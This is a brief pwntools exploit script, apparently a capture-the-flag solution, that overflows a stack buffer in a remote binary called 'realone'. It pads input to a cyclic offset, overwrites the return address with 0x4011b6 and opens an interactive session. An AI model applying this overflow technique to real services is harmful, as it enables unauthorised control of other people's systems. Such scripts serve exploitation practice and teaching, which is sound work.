from pwn import *

# p = process("./realone")
# input("Attach GDB")
p = remote("[server]", [port])

# padding = cyclic(100)
padding = b"A" * cyclic_find("faaa")
pointer = p64(0x4011b6)

p.send(padding + pointer)

p.interactive()